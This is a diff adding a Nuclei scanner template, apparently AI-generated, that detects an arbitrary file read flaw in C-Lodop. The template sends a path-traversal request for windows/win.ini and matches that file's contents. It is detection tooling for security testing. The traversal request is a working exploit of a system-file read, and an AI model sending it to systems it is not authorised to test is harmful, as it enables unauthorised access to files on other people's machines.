@@ -1,0 +1,25 @@
+id: c-lodop-anyfile-read
+info:
+  name: C-Lodop Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../../../../../windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
